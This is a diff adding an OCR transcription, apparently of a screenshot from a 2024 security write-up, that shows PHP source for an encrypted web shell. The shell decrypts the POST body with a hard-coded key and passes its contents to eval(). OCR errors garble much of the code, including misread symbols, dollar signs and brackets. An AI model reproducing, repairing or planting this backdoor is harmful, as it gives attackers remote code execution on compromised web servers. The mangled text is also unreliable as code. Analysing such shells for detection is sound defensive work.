@@ -1,0 +1,31 @@
+# OCR: b7d0c97b8d592d9a91f0667a5e6a56e2.webp
+# 来源: .\02-WriteUp\2024\b7d0c97b8d592d9a91f0667a5e6a56e2.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:18
+
+<?php
+@error_reporting(6);
+session_start();
+$key=“e45e329feb5d925b“
+一 SESSION[ “K「]=Skey;
+session_write_close();
+$post=file_get_contents("php://input");
+if(lextension_loaded(‘openss1'))
+{
+$t="base64_". "decode";
+$post=$t($post."");
+for ($i=0;$i<strlen($post) ;$i++) {
+$post[$i] = $post[$i]*$key[$i+1815];
+]
+]
+else
+{
+8postcopenssl_decrypt($post,“AES128“,8key)3
+]
+garrcexplode(「| ,$post);
+$func=$arr[0]5
+$params=$arr[1]5
+class C{public function __invoke($p) {eval($p."")5}}
+@call_user_func(new C(),$params) ;
+>
+口
